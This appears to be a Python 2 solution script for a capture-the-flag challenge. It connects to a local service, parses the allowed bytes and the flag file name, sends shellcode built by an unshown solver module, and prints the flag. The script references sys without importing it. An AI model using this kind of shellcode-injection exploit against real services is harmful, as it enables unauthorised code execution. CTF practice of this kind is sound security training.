#!/usr/bin/env python

import argparse
import re
import socket
import time

import solver


def main():
    parser = argparse.ArgumentParser(description='asg')
    parser.add_argument(
        '--test',
        dest='test',
        action='store_const',
        const=True,
        default=False,
        help='Testing of not')
    parser.add_argument(
        '--nocheck',
        dest='check',
        action='store_const',
        const=False,
        default=True)
    args = parser.parse_args()

    address = 'localhost'
    port = 9025

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((address, port))
    sock.recv(1000)  # ignore
    sock.send("\n")

    if args.test:
        time.sleep(0.1)  # for sleep 5
    else:
        time.sleep(6)

    s = sock.recv(1000)

    r = re.search(
        r'these are filtered set of bytes:\n(.*)flag is inside this file: \[(.*)\]',
        s, re.DOTALL)

    filt = r.group(1)
    flag = r.group(2)
    if len(filt) != 128:
        sys.stderr.write('len(filt) must be 128, but was %d.' % len(filt))
        exit(1)

    code = solver.gen_shellcode(filt, flag)
    if not code:
        exit(0)

    sock.send(solver.asm(code))

    if args.test:
        time.sleep(1.1)  # for sleep 1
    else:
        time.sleep(11)  # for sleep 10

    print sock.recv(1000)  # buena ...

    time.sleep(1)

    print 'flag: ', sock.recv(100)
    exit(1)


if __name__ == "__main__":
    main()
